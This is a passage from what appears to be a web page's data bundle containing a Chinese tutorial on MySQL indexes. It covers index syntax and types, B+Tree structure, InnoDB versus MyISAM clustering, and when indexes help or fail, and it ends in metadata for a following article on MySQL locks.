pk_clolum（length）建立索引，不允许重复，不允许空值；\n\nALTER TABLE 'table_name' ADD PRIMARY KEY pk_index('col');\n\n\n1\n\n\n2、唯一索引：用来建立索引的列的值必须是唯一的，允许空值\n\nALTER TABLE 'table_name' ADD UNIQUE index_name('col');\n\n\n1\n\n\n3、普通索引：用表中的普通列构建的索引，没有任何限制\n\nALTER TABLE 'table_name' ADD INDEX index_name('col');\n\n\n1\n\n\n4、全文索引：用大文本对象的列构建的索引（下一部分会讲解）\n\nALTER TABLE 'table_name' ADD FULLTEXT INDEX ft_index('col');\n\n\n1\n\n\n5、组合索引：用多个列组合构建的索引，这多个列中的值不允许有空值\n\nALTER TABLE 'table_name' ADD INDEX index_name('col1','col2','col3');\n\n\n1\n\n * 遵循 “最左前缀” 原则，把最常用作为检索或排序的列放在最左，依次递减，组合索引相当于建立了 col1,col1col2,col1col2col3 三个索引，而 col2 或者 col3 是不能使用索引的。\n * 在使用组合索引的时候可能因为列名长度过长而导致索引的 key 太大，导致效率降低，在允许的情况下，可以只取 col1 和 col2 的前几个字符作为索引\n * ALTER TABLE 'table_name' ADD INDEX index_name(col1(4),col2(3))；\n   表示使用 col1 的前 4 个字符和 col2 的前 3 个字符作为索引\n\n\n# 索引的实现原理\n\nMySQL 支持诸多存储引擎，而各种存储引擎对索引的支持也各不相同，因此 MySQL 数据库支持多种索引类型，如 BTree 索引，B+Tree 索引，哈希索引，全文索引等等，\n\n\n# 哈希索引：\n\n只有 memory（内存）存储引擎支持哈希索引，哈希索引用索引列的值计算该值的 hashCode，然后在 hashCode 相应的位置存执该值所在行数据的物理位置，因为使用散列算法，因此访问速度非常快，但是一个值只能对应一个 hashCode，而且是散列的分布方式，因此哈希索引不支持范围查找和排序的功能。\n\n\n# 全文索引：\n\nFULLTEXT（全文）索引，仅可用于 MyISAM 和 InnoDB，针对较大的数据，生成全文索引非常的消耗时间和空间。对于文本的大对象，或者较大的 CHAR 类型的数据，如果使用普通索引，那么匹配文本前几个字符还是可行的，但是想要匹配文本中间的几个单词，那么就要使用 LIKE % word% 来匹配，这样需要很长的时间来处理，响应时间会大大增加，这种情况，就可使用时 FULLTEXT 索引了，在生成 FULLTEXT 索引时，会为文本生成一份单词的清单，在索引时及根据这个单词的清单来索引。FULLTEXT 可以在创建表的时候创建，也可以在需要的时候用 ALTER 或者 CREATE INDEX 来添加：\n\n--创建表的时候添加FULLTEXT索引\nCTREATE TABLE my_table(\n    id INT(10) PRIMARY KEY,\n    name VARCHAR(10) NOT NULL,\n    my_text TEXT,\n    FULLTEXT(my_text)\n)ENGINE=MyISAM DEFAULT CHARSET=utf8;\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n--创建表以后，在需要的时候添加FULLTEXT索引\nALTER TABLE my_table ADD FULLTEXT INDEX ft_index(column_name);\n\n\n1\n2\n\n\n全文索引的查询也有自己特殊的语法，而不能使用 LIKE % 查询字符串 % 的模糊查询语法\n\nSELECT * FROM table_name MATCH(ft_index) AGAINST('查询字符串');\n\n\n1\n\n\n\n# 注意：\n\n * 对于较大的数据集，把数据添加到一个没有 FULLTEXT 索引的表，然后添加 FULLTEXT 索引的速度比把数据添加到一个已经有 FULLTEXT 索引的表快。\n\n * 5.6 版本前的 MySQL 自带的全文索引只能用于 MyISAM 存储引擎，如果是其它数据引擎，那么全文索引不会生效。5.6 版本之后 InnoDB 存储引擎开始支持全文索引\n\n * 在 MySQL 中，全文索引支队英文有用，目前对中文还不支持。5.7 版本之后通过使用 ngram 插件开始支持中文。\n\n * 在 MySQL 中，如果检索的字符串太短则无法检索得到预期的结果，检索的字符串长度至少为 4 字节，此外，如果检索的字符包括停止词，那么停止词会被忽略。\n\n\n# BTree 索引和 B+Tree 索引\n\n1、BTree 索引\nBTree 是平衡搜索多叉树，设树的度为 2d（d>1），高度为 h，那么 BTree 要满足以一下条件：\n\n * 每个叶子结点的高度一样，等于 h；\n * 每个非叶子结点由 n-1 个 key 和 n 个指针 point 组成，其中 d<=n<=2d,key 和 point 相互间隔，结点两端一定是 key；\n * 叶子结点指针都为 null；\n * 非叶子结点的 key 都是 [key,data] 二元组，其中 key 表示作为索引的键，data 为键值所在行的数据；\n   结构如下：\n\n\n\n在 BTree 的机构下，就可以使用二分查找的查找方式，查找复杂度为 h*log (n)，一般来说树的高度是很小的，一般为 3 左右，因此 BTree 是一个非常高效的查找结构。\n\n2、B+Tree 索引\nB+Tree 是 BTree 的一个变种，设 d 为树的度数，h 为树的高度，B+Tree 和 BTree 的不同主要在于：\n\n * B+Tree 中的非叶子结点不存储数据，只存储键值；\n * B+Tree 的叶子结点没有指针，所有键值都会出现在叶子结点上，且 key 存储的键值对应 data 数据的物理地址；\n * B+Tree 的每个非叶子节点由 n 个键值 key 和 n 个指针 point 组成；\n   B+Tree 的结构如下：\n\n\n\nB+Tree 对比 BTree 的优点：\n\n * 磁盘读写代价更低\n   一般来说 B+Tree 比 BTree 更适合实现外存的索引结构，因为存储引擎的设计专家巧妙的利用了外存（磁盘）的存储结构，即磁盘的最小存储单位是扇区（sector），而操作系统的块（block）通常是整数倍的 sector，操作系统以页（page）为单位管理内存，一页（page）通常默认为 4K，数据库的页通常设置为操作系统页的整数倍，因此索引结构的节点被设计为一个页的大小，然后利用外存的 “预读取” 原则，每次读取的时候，把整个节点的数据读取到内存中，然后在内存中查找，已知内存的读取速度是外存读取 I/O 速度的几百倍，那么提升查找速度的关键就在于尽可能少的磁盘 I/O，那么可以知道，每个节点中的 key 个数越多，那么树的高度越小，需要 I/O 的次数越少，因此一般来说 B+Tree 比 BTree 更快，因为 B+Tree 的非叶节点中不存储 data，就可以存储更多的 key。\n\n * 查询速度更稳定\n   由于 B+Tree 非叶子节点不存储数据（data），因此所有的数据都要查询至叶子节点，而叶子节点的高度都是相同的，因此所有数据的查询速度都是一样的。\n   更多操作系统内容参考：\n   硬盘结构\n   扇区、块、簇、页的区别\n   操作系统层优化（进阶，初学不用看）\n\n带顺序索引的 B+TREE：\n很多存储引擎在 B+Tree 的基础上进行了优化，添加了指向相邻叶节点的指针，形成了带有顺序访问指针的 B+Tree，这样做是为了提高区间查找的效率，只要找到第一个值那么就可以顺序的查找后面的值\nB+Tree 的结构如下：\n\n\n\n3、聚簇索引和非聚簇索引\n分析了 MySQL 的索引结构的实现原理，然后我们来看看具体的存储引擎怎么实现索引结构的，MySQL 中最常见的两种存储引擎分别是 MyISAM 和 InnoDB，分别实现了非聚簇索引和聚簇索引。\n\n聚簇索引的解释是：聚簇索引的顺序就是数据的物理存储顺序\n\n非聚簇索引的解释是：索引顺序与数据物理排列顺序无关\n\n（这样说起来并不好理解，让人摸不着头脑，清继续看下文，并在插图下方对上述两句话有解释）\n\n首先要介绍几个概念，在索引的分类中，我们可以按照索引的键是否为主键来分为 “主索引” 和 “辅助索引”，使用主键键值建立的索引称为 “主索引”，其它的称为 “辅助索引”。因此主索引只能有一个，辅助索引可以有很多个。\n\n4、MyISAM—— 非聚簇索引\n\n * MyISAM 存储引擎采用的是非聚簇索引，非聚簇索引的主索引和辅助索引几乎是一样的，只是主索引不允许重复，不允许空值，他们的叶子结点的 key 都存储指向键值对应的数据的物理地址。\n * 非聚簇索引的数据表和索引表是分开存储的。\n * 非聚簇索引中的数据是根据数据的插入顺序保存。因此非聚簇索引更适合单个数据的查询。插入顺序不受键值影响。\n * 只有在 MyISAM 中才能使用 FULLTEXT 索引。(mysql5.6 以后 innoDB 也支持全文索引)\n\n最开始我一直不懂既然非聚簇索引的主索引和辅助索引指向相同的内容，为什么还要辅助索引这个东西呢，后来才明白索引不就是用来查询的吗，用在那些地方呢，不就是 WHERE 和 ORDER BY 语句后面吗，那么如果查询的条件不是主键怎么办呢，这个时候就需要辅助索引了。\n\n5、InnoDB—— 聚簇索引\n\n * 聚簇索引的主索引的叶子结点存储的是键值对应的数据本身，辅助索引的叶子结点存储的是键值对应的数据的主键键值。因此主键的值长度越小越好，类型越简单越好。\n * 聚簇索引的数据和主键索引存储在一起。\n * 聚簇索引的数据是根据主键的顺序保存。因此适合按主键索引的区间查找，可以有更少的磁盘 I/O，加快查询速度。但是也是因为这个原因，聚簇索引的插入顺序最好按照主键单调的顺序插入，否则会频繁的引起页分裂，严重影响性能。\n * 在 InnoDB 中，如果只需要查找索引的列，就尽量不要加入其它的列，这样会提高查询效率。\n   使用主索引的时候，更适合使用聚簇索引，因为聚簇索引只需要查找一次，而非聚簇索引在查到数据的地址后，还要进行一次 I/O 查找数据。\n\n因为聚簇辅助索引存储的是主键的键值，因此可以在数据行移动或者页分裂的时候降低成本，因为这时不用维护辅助索引。但是由于主索引存储的是数据本身，因此聚簇索引会占用更多的空间。\n\n聚簇索引在插入新数据的时候比非聚簇索引慢很多，因为插入新数据时需要检测主键是否重复，这需要遍历主索引的所有叶节点，而非聚簇索引的叶节点保存的是数据地址，占用空间少，因此分布集中，查询的时候 I/O 更少，但聚簇索引的主索引中存储的是数据本身，数据占用空间大，分布范围更大，可能占用好多的扇区，因此需要更多次 I/O 才能遍历完毕。\n\n下图可以形象的说明聚簇索引和非聚簇索引的区别：\n\n\n\n从上图中可以看到聚簇索引的辅助索引的叶子节点的 data 存储的是主键的值，主索引的叶子节点的 data 存储的是数据本身，也就是说数据和索引存储在一起，并且索引查询到的地方就是数据（data）本身，那么索引的顺序和数据本身的顺序就是相同的；\n\n而非聚簇索引的主索引和辅助索引的叶子节点的 data 都是存储的数据的物理地址，也就是说索引和数据并不是存储在一起的，数据的顺序和索引的顺序并没有任何关系，也就是索引顺序与数据物理排列顺序无关。\n\n此外 MyISAM 和 innoDB 的区别总结如下：\n\n\n\n6、总结\n\n * InnoDB 支持事务，支持行级别锁定，支持 B-tree、Full-text 等索引，不支持 Hash 索引；\n * MyISAM 不支持事务，支持表级别锁定，支持 B-tree、Full-text 等索引，不支持 Hash 索引；\n   此外，Memory 不支持事务，支持表级别锁定，支持 B-tree、Hash 等索引，不支持 Full-text 索引；\n\n\n# 索引的使用策略\n\n\n# 什么时候要使用索引？\n\n * 主键自动建立唯一索引；\n * 经常作为查询条件在 WHERE 或者 ORDER BY 语句中出现的列要建立索引；\n * 作为排序的列要建立索引；\n * 查询中与其他表关联的字段，外键关系建立索引\n * 高并发条件下倾向组合索引；\n * 用于聚合函数的列可以建立索引，例如使用了 max (column_1) 或者 count (column_1) 时的 column_1 就需要建立索引\n\n\n# 什么时候不要使用索引？\n\n * 经常增删改的列不要建立索引；\n * 有大量重复的列不建立索引；\n * 表记录太少不要建立索引。只有当数据库里已经有了足够多的测试数据时，它的性能测试结果才有实际参考价值。如果在测试数据库里只有几百条数据记录，它们往往在执行完第一条查询命令之后就被全部加载到内存里，这将使后续的查询命令都执行得非常快 -- 不管有没有使用索引。只有当数据库里的记录超过了 1000 条、数据总量也超过了 MySQL 服务器上的内存总量时，数据库的性能测试结果才有意义。\n\n\n# 索引失效的情况：\n\n * 在组合索引中不能有列的值为 NULL，如果有，那么这一列对组合索引就是无效的。\n\n * 在一个 SELECT 语句中，索引只能使用一次，如果在 WHERE 中使用了，那么在 ORDER BY 中就不要用了。\n\n * LIKE 操作中，'% aaa%' 不会使用索引，也就是索引会失效，但是‘aaa%’可以使用索引。\n\n * 在索引的列上使用表达式或者函数会使索引失效，例如：select * from users where YEAR (adddate)<2007，将在每个行上进行运算，这将导致索引失效而进行全表扫描，因此我们可以改成：select * from users where adddate<’2007-01-01′。其它通配符同样，也就是说，在查询条件中使用正则表达式时，只有在搜索模板的第一个字符不是通配符的情况下才能使用索引。\n\n * 在查询条件中使用不等于，包括 <符号、> 符号和！= 会导致索引失效。特别的是如果对主键索引使用！= 则不会使索引失效，如果对主键索引或者整数类型的索引使用 < 符号或者 > 符号不会使索引失效。（经 erwkjrfhjwkdb 同学提醒，不等于，包括 < 符号、> 符号和！，如果占总记录的比例很小的话，也不会失效）\n\n * 在查询条件中使用 IS NULL 或者 IS NOT NULL 会导致索引失效。\n\n * 字符串不加单引号会导致索引失效。更准确的说是类型不一致会导致失效，比如字段 email 是字符串类型的，使用 WHERE email=99999 则会导致失败，应该改为 WHERE email='99999'。\n\n * 在查询条件中使用 OR 连接多个条件会导致索引失效，除非 OR 链接的每个条件都加上索引，这时应该改为两次查询，然后用 UNION ALL 连接起来。\n\n * 如果排序的字段使用了索引，那么 select 的字段也要是索引字段，否则索引失效。特别的是如果排序的是主键索引则 select * 也不会导致索引失效。\n\n * 尽量不要包括多列排序，如果一定要，最好为这队列构建组合索引；\n\n\n# 索引的优化\n\n1、最左前缀\n\n索引的最左前缀和和 B+Tree 中的 “最左前缀原理” 有关，举例来说就是如果设置了组合索引 < col1,col2,col3 > 那么以下 3 中情况可以使用索引：col1，<col1,col2>，<col1,col2,col3>，其它的列，比如 < col2,col3>，<col1,col3>，col2，col3 等等都是不能使用索引的。\n\n根据最左前缀原则，我们一般把排序分组频率最高的列放在最左边，以此类推。\n\n2、带索引的模糊查询优化\n\n在上面已经提到，使用 LIKE 进行模糊查询的时候，'% aaa%' 不会使用索引，也就是索引会失效。如果是这种情况，只能使用全文索引来进行优化（上文有讲到）。\n\n3、为检索的条件构建全文索引，然后使用\n\nSELECT * FROM tablename MATCH(index_colum) ANGAINST('word');\n\n\n1\n\n\n4、使用短索引\n\n对串列进行索引，如果可能应该指定一个前缀长度。例如，如果有一个 CHAR (255) 的 列，如果在前 10 个或 20 个字符内，多数值是惟一的，那么就不要对整个列进行索引。短索引不仅可以提高查询速度而且可以节省磁盘空间和 I/O 操作。",normalizedContent:"# mysql 中索引的语法\n\n\n# 创建索引\n\n在创建表的时候添加索引\n\ncreate table mytable(  \n    id int not null,   \n    username varchar(16) not null,  \n    index [indexname] (username(length))  \n); \n\n\n1\n2\n3\n4\n5\n\n\n在创建表以后添加索引\n\nalter table my_table add [unique] index index_name(column_name);\n# 或者\ncreate index index_name on my_table(column_name);\n\n\n1\n2\n3\n\n\n\n# 注意：\n\n 1. 索引需要占用磁盘空间，因此在创建索引时要考虑到磁盘空间是否足够\n 2. 创建索引时需要对表加锁，因此实际操作中需要在业务空闲期间进行\n\n\n# 根据索引查询\n\n--具体查询：\nselect * from table_name where column_1=column_2;(为column_1建立了索引)\n\n--或者模糊查询\nselect * from table_name where column_1 like '%三'\nselect * from table_name where column_1 like '三%'\nselect * from table_name where column_1 like '%三%'\n\nselect * from table_name where column_1 like '_好_'\n\n--如果要表示在字符串中既有a又有b，那么查询语句为：\nselect * from table_name where column_1 like '%a%' and column_1 like '%b%';\n\nselect * from table_name where column_1 like '[张李王]三';  --表示column_1中有匹配张三、李三、王三的都可以\nselect * from table_name where column_1 like '[^张李王]三';  --表示column_1中有匹配除了张三、李三、王三的其他三都可以\n\n-- 在模糊查询中，%表示任意0个或多个字符；_表示任意单个字符（有且仅有），通常用来限制字符串长度;[]表示其中的某一个字符；[^]表示除了其中的字符的所有字符\n\n--或者在全文索引中模糊查询\nselect * from table_name where match(content) against('word1','word2',...);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 删除索引\n\ndrop index my_index on tablename;\n--或者\nalter table table_name drop index index_name;\n\n\n1\n2\n3\n\n\n\n# 查看表中的索引\n\nshow index from tablename\n\n\n1\n\n\n\n# 查看查询语句使用索引的情况\n\n-- explain 查询语句\nexplain select * from table_name where column_1='123';\n\n\n1\n2\n\n\n\n# 索引的优缺点\n\n优势：可以快速检索，减少 i/o 次数，加快检索速度；根据索引分组和排序，可以加快分组和排序；\n\n劣势：索引本身也是表，因此会占用存储空间，一般来说，索引表占用的空间的数据表的 1.5 倍；索引表的维护和创建需要时间成本，这个成本随着数据量增大而增大；构建索引会降低数据表的修改操作（删除，添加，修改）的效率，因为在修改数据表的同时还需要修改索引表；\n\n\n# 索引的分类\n\n\n# 常见的索引类型有：主键索引、唯一索引、普通索引、全文索引、组合索引\n\n1、主键索引：即主索引，根据主键 pk_clolum（length）建立索引，不允许重复，不允许空值；\n\nalter table 'table_name' add primary key pk_index('col');\n\n\n1\n\n\n2、唯一索引：用来建立索引的列的值必须是唯一的，允许空值\n\nalter table 'table_name' add unique index_name('col');\n\n\n1\n\n\n3、普通索引：用表中的普通列构建的索引，没有任何限制\n\nalter table 'table_name' add index index_name('col');\n\n\n1\n\n\n4、全文索引：用大文本对象的列构建的索引（下一部分会讲解）\n\nalter table 'table_name' add fulltext index ft_index('col');\n\n\n1\n\n\n5、组合索引：用多个列组合构建的索引，这多个列中的值不允许有空值\n\nalter table 'table_name' add index index_name('col1','col2','col3');\n\n\n1\n\n * 遵循 “最左前缀” 原则，把最常用作为检索或排序的列放在最左，依次递减，组合索引相当于建立了 col1,col1col2,col1col2col3 三个索引，而 col2 或者 col3 是不能使用索引的。\n * 在使用组合索引的时候可能因为列名长度过长而导致索引的 key 太大，导致效率降低，在允许的情况下，可以只取 col1 和 col2 的前几个字符作为索引\n * alter table 'table_name' add index index_name(col1(4),col2(3))；\n   表示使用 col1 的前 4 个字符和 col2 的前 3 个字符作为索引\n\n\n# 索引的实现原理\n\nmysql 支持诸多存储引擎，而各种存储引擎对索引的支持也各不相同，因此 mysql 数据库支持多种索引类型，如 btree 索引，b+tree 索引，哈希索引，全文索引等等，\n\n\n# 哈希索引：\n\n只有 memory（内存）存储引擎支持哈希索引，哈希索引用索引列的值计算该值的 hashcode，然后在 hashcode 相应的位置存执该值所在行数据的物理位置，因为使用散列算法，因此访问速度非常快，但是一个值只能对应一个 hashcode，而且是散列的分布方式，因此哈希索引不支持范围查找和排序的功能。\n\n\n# 全文索引：\n\nfulltext（全文）索引，仅可用于 myisam 和 innodb，针对较大的数据，生成全文索引非常的消耗时间和空间。对于文本的大对象，或者较大的 char 类型的数据，如果使用普通索引，那么匹配文本前几个字符还是可行的，但是想要匹配文本中间的几个单词，那么就要使用 like % word% 来匹配，这样需要很长的时间来处理，响应时间会大大增加，这种情况，就可使用时 fulltext 索引了，在生成 fulltext 索引时，会为文本生成一份单词的清单，在索引时及根据这个单词的清单来索引。fulltext 可以在创建表的时候创建，也可以在需要的时候用 alter 或者 create index 来添加：\n\n--创建表的时候添加fulltext索引\nctreate table my_table(\n    id int(10) primary key,\n    name varchar(10) not null,\n    my_text text,\n    fulltext(my_text)\n)engine=myisam default charset=utf8;\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n--创建表以后，在需要的时候添加fulltext索引\nalter table my_table add fulltext index ft_index(column_name);\n\n\n1\n2\n\n\n全文索引的查询也有自己特殊的语法，而不能使用 like % 查询字符串 % 的模糊查询语法\n\nselect * from table_name match(ft_index) against('查询字符串');\n\n\n1\n\n\n\n# 注意：\n\n * 对于较大的数据集，把数据添加到一个没有 fulltext 索引的表，然后添加 fulltext 索引的速度比把数据添加到一个已经有 fulltext 索引的表快。\n\n * 5.6 版本前的 mysql 自带的全文索引只能用于 myisam 存储引擎，如果是其它数据引擎，那么全文索引不会生效。5.6 版本之后 innodb 存储引擎开始支持全文索引\n\n * 在 mysql 中，全文索引支队英文有用，目前对中文还不支持。5.7 版本之后通过使用 ngram 插件开始支持中文。\n\n * 在 mysql 中，如果检索的字符串太短则无法检索得到预期的结果，检索的字符串长度至少为 4 字节，此外，如果检索的字符包括停止词，那么停止词会被忽略。\n\n\n# btree 索引和 b+tree 索引\n\n1、btree 索引\nbtree 是平衡搜索多叉树，设树的度为 2d（d>1），高度为 h，那么 btree 要满足以一下条件：\n\n * 每个叶子结点的高度一样，等于 h；\n * 每个非叶子结点由 n-1 个 key 和 n 个指针 point 组成，其中 d<=n<=2d,key 和 point 相互间隔，结点两端一定是 key；\n * 叶子结点指针都为 null；\n * 非叶子结点的 key 都是 [key,data] 二元组，其中 key 表示作为索引的键，data 为键值所在行的数据；\n   结构如下：\n\n\n\n在 btree 的机构下，就可以使用二分查找的查找方式，查找复杂度为 h*log (n)，一般来说树的高度是很小的，一般为 3 左右，因此 btree 是一个非常高效的查找结构。\n\n2、b+tree 索引\nb+tree 是 btree 的一个变种，设 d 为树的度数，h 为树的高度，b+tree 和 btree 的不同主要在于：\n\n * b+tree 中的非叶子结点不存储数据，只存储键值；\n * b+tree 的叶子结点没有指针，所有键值都会出现在叶子结点上，且 key 存储的键值对应 data 数据的物理地址；\n * b+tree 的每个非叶子节点由 n 个键值 key 和 n 个指针 point 组成；\n   b+tree 的结构如下：\n\n\n\nb+tree 对比 btree 的优点：\n\n * 磁盘读写代价更低\n   一般来说 b+tree 比 btree 更适合实现外存的索引结构，因为存储引擎的设计专家巧妙的利用了外存（磁盘）的存储结构，即磁盘的最小存储单位是扇区（sector），而操作系统的块（block）通常是整数倍的 sector，操作系统以页（page）为单位管理内存，一页（page）通常默认为 4k，数据库的页通常设置为操作系统页的整数倍，因此索引结构的节点被设计为一个页的大小，然后利用外存的 “预读取” 原则，每次读取的时候，把整个节点的数据读取到内存中，然后在内存中查找，已知内存的读取速度是外存读取 i/o 速度的几百倍，那么提升查找速度的关键就在于尽可能少的磁盘 i/o，那么可以知道，每个节点中的 key 个数越多，那么树的高度越小，需要 i/o 的次数越少，因此一般来说 b+tree 比 btree 更快，因为 b+tree 的非叶节点中不存储 data，就可以存储更多的 key。\n\n * 查询速度更稳定\n   由于 b+tree 非叶子节点不存储数据（data），因此所有的数据都要查询至叶子节点，而叶子节点的高度都是相同的，因此所有数据的查询速度都是一样的。\n   更多操作系统内容参考：\n   硬盘结构\n   扇区、块、簇、页的区别\n   操作系统层优化（进阶，初学不用看）\n\n带顺序索引的 b+tree：\n很多存储引擎在 b+tree 的基础上进行了优化，添加了指向相邻叶节点的指针，形成了带有顺序访问指针的 b+tree，这样做是为了提高区间查找的效率，只要找到第一个值那么就可以顺序的查找后面的值\nb+tree 的结构如下：\n\n\n\n3、聚簇索引和非聚簇索引\n分析了 mysql 的索引结构的实现原理，然后我们来看看具体的存储引擎怎么实现索引结构的，mysql 中最常见的两种存储引擎分别是 myisam 和 innodb，分别实现了非聚簇索引和聚簇索引。\n\n聚簇索引的解释是：聚簇索引的顺序就是数据的物理存储顺序\n\n非聚簇索引的解释是：索引顺序与数据物理排列顺序无关\n\n（这样说起来并不好理解，让人摸不着头脑，清继续看下文，并在插图下方对上述两句话有解释）\n\n首先要介绍几个概念，在索引的分类中，我们可以按照索引的键是否为主键来分为 “主索引” 和 “辅助索引”，使用主键键值建立的索引称为 “主索引”，其它的称为 “辅助索引”。因此主索引只能有一个，辅助索引可以有很多个。\n\n4、myisam—— 非聚簇索引\n\n * myisam 存储引擎采用的是非聚簇索引，非聚簇索引的主索引和辅助索引几乎是一样的，只是主索引不允许重复，不允许空值，他们的叶子结点的 key 都存储指向键值对应的数据的物理地址。\n * 非聚簇索引的数据表和索引表是分开存储的。\n * 非聚簇索引中的数据是根据数据的插入顺序保存。因此非聚簇索引更适合单个数据的查询。插入顺序不受键值影响。\n * 只有在 myisam 中才能使用 fulltext 索引。(mysql5.6 以后 innodb 也支持全文索引)\n\n最开始我一直不懂既然非聚簇索引的主索引和辅助索引指向相同的内容，为什么还要辅助索引这个东西呢，后来才明白索引不就是用来查询的吗，用在那些地方呢，不就是 where 和 order by 语句后面吗，那么如果查询的条件不是主键怎么办呢，这个时候就需要辅助索引了。\n\n5、innodb—— 聚簇索引\n\n * 聚簇索引的主索引的叶子结点存储的是键值对应的数据本身，辅助索引的叶子结点存储的是键值对应的数据的主键键值。因此主键的值长度越小越好，类型越简单越好。\n * 聚簇索引的数据和主键索引存储在一起。\n * 聚簇索引的数据是根据主键的顺序保存。因此适合按主键索引的区间查找，可以有更少的磁盘 i/o，加快查询速度。但是也是因为这个原因，聚簇索引的插入顺序最好按照主键单调的顺序插入，否则会频繁的引起页分裂，严重影响性能。\n * 在 innodb 中，如果只需要查找索引的列，就尽量不要加入其它的列，这样会提高查询效率。\n   使用主索引的时候，更适合使用聚簇索引，因为聚簇索引只需要查找一次，而非聚簇索引在查到数据的地址后，还要进行一次 i/o 查找数据。\n\n因为聚簇辅助索引存储的是主键的键值，因此可以在数据行移动或者页分裂的时候降低成本，因为这时不用维护辅助索引。但是由于主索引存储的是数据本身，因此聚簇索引会占用更多的空间。\n\n聚簇索引在插入新数据的时候比非聚簇索引慢很多，因为插入新数据时需要检测主键是否重复，这需要遍历主索引的所有叶节点，而非聚簇索引的叶节点保存的是数据地址，占用空间少，因此分布集中，查询的时候 i/o 更少，但聚簇索引的主索引中存储的是数据本身，数据占用空间大，分布范围更大，可能占用好多的扇区，因此需要更多次 i/o 才能遍历完毕。\n\n下图可以形象的说明聚簇索引和非聚簇索引的区别：\n\n\n\n从上图中可以看到聚簇索引的辅助索引的叶子节点的 data 存储的是主键的值，主索引的叶子节点的 data 存储的是数据本身，也就是说数据和索引存储在一起，并且索引查询到的地方就是数据（data）本身，那么索引的顺序和数据本身的顺序就是相同的；\n\n而非聚簇索引的主索引和辅助索引的叶子节点的 data 都是存储的数据的物理地址，也就是说索引和数据并不是存储在一起的，数据的顺序和索引的顺序并没有任何关系，也就是索引顺序与数据物理排列顺序无关。\n\n此外 myisam 和 innodb 的区别总结如下：\n\n\n\n6、总结\n\n * innodb 支持事务，支持行级别锁定，支持 b-tree、full-text 等索引，不支持 hash 索引；\n * myisam 不支持事务，支持表级别锁定，支持 b-tree、full-text 等索引，不支持 hash 索引；\n   此外，memory 不支持事务，支持表级别锁定，支持 b-tree、hash 等索引，不支持 full-text 索引；\n\n\n# 索引的使用策略\n\n\n# 什么时候要使用索引？\n\n * 主键自动建立唯一索引；\n * 经常作为查询条件在 where 或者 order by 语句中出现的列要建立索引；\n * 作为排序的列要建立索引；\n * 查询中与其他表关联的字段，外键关系建立索引\n * 高并发条件下倾向组合索引；\n * 用于聚合函数的列可以建立索引，例如使用了 max (column_1) 或者 count (column_1) 时的 column_1 就需要建立索引\n\n\n# 什么时候不要使用索引？\n\n * 经常增删改的列不要建立索引；\n * 有大量重复的列不建立索引；\n * 表记录太少不要建立索引。只有当数据库里已经有了足够多的测试数据时，它的性能测试结果才有实际参考价值。如果在测试数据库里只有几百条数据记录，它们往往在执行完第一条查询命令之后就被全部加载到内存里，这将使后续的查询命令都执行得非常快 -- 不管有没有使用索引。只有当数据库里的记录超过了 1000 条、数据总量也超过了 mysql 服务器上的内存总量时，数据库的性能测试结果才有意义。\n\n\n# 索引失效的情况：\n\n * 在组合索引中不能有列的值为 null，如果有，那么这一列对组合索引就是无效的。\n\n * 在一个 select 语句中，索引只能使用一次，如果在 where 中使用了，那么在 order by 中就不要用了。\n\n * like 操作中，'% aaa%' 不会使用索引，也就是索引会失效，但是‘aaa%’可以使用索引。\n\n * 在索引的列上使用表达式或者函数会使索引失效，例如：select * from users where year (adddate)<2007，将在每个行上进行运算，这将导致索引失效而进行全表扫描，因此我们可以改成：select * from users where adddate<’2007-01-01′。其它通配符同样，也就是说，在查询条件中使用正则表达式时，只有在搜索模板的第一个字符不是通配符的情况下才能使用索引。\n\n * 在查询条件中使用不等于，包括 <符号、> 符号和！= 会导致索引失效。特别的是如果对主键索引使用！= 则不会使索引失效，如果对主键索引或者整数类型的索引使用 < 符号或者 > 符号不会使索引失效。（经 erwkjrfhjwkdb 同学提醒，不等于，包括 < 符号、> 符号和！，如果占总记录的比例很小的话，也不会失效）\n\n * 在查询条件中使用 is null 或者 is not null 会导致索引失效。\n\n * 字符串不加单引号会导致索引失效。更准确的说是类型不一致会导致失效，比如字段 email 是字符串类型的，使用 where email=99999 则会导致失败，应该改为 where email='99999'。\n\n * 在查询条件中使用 or 连接多个条件会导致索引失效，除非 or 链接的每个条件都加上索引，这时应该改为两次查询，然后用 union all 连接起来。\n\n * 如果排序的字段使用了索引，那么 select 的字段也要是索引字段，否则索引失效。特别的是如果排序的是主键索引则 select * 也不会导致索引失效。\n\n * 尽量不要包括多列排序，如果一定要，最好为这队列构建组合索引；\n\n\n# 索引的优化\n\n1、最左前缀\n\n索引的最左前缀和和 b+tree 中的 “最左前缀原理” 有关，举例来说就是如果设置了组合索引 < col1,col2,col3 > 那么以下 3 中情况可以使用索引：col1，<col1,col2>，<col1,col2,col3>，其它的列，比如 < col2,col3>，<col1,col3>，col2，col3 等等都是不能使用索引的。\n\n根据最左前缀原则，我们一般把排序分组频率最高的列放在最左边，以此类推。\n\n2、带索引的模糊查询优化\n\n在上面已经提到，使用 like 进行模糊查询的时候，'% aaa%' 不会使用索引，也就是索引会失效。如果是这种情况，只能使用全文索引来进行优化（上文有讲到）。\n\n3、为检索的条件构建全文索引，然后使用\n\nselect * from tablename match(index_colum) angainst('word');\n\n\n1\n\n\n4、使用短索引\n\n对串列进行索引，如果可能应该指定一个前缀长度。例如，如果有一个 char (255) 的 列，如果在前 10 个或 20 个字符内，多数值是惟一的，那么就不要对整个列进行索引。短索引不仅可以提高查询速度而且可以节省磁盘空间和 i/o 操作。",charsets:{cjk:!0}},{title:"MySQL 锁介绍",frontmatter:{title:"MySQL 锁介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/mysql/1301",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/03.%E5%A4%A7%E6%95%B0%E6%8D%AE/04.mysql/1301.MySQL%20%E9%94%81%E4%BB%8B%E7%BB%8D.html",relativePath:"03.大数据/04.mysql/1301.MySQL 锁介绍.md",key:"v-a652ea48",path:"/mysql/1301/",headers:[{level:2,title:"前言",slug:"前言",normalizedTitle:"前言",charIndex:2},{level:2,title:"普通锁",slug:"普通锁",normalizedTitle:"普通锁",charIndex:173},{level:2,title:"意向锁",slug:"意向锁",normalizedTitle:"意向锁",charIndex:750},{level:3,title:"注意：这里的 X 锁、S 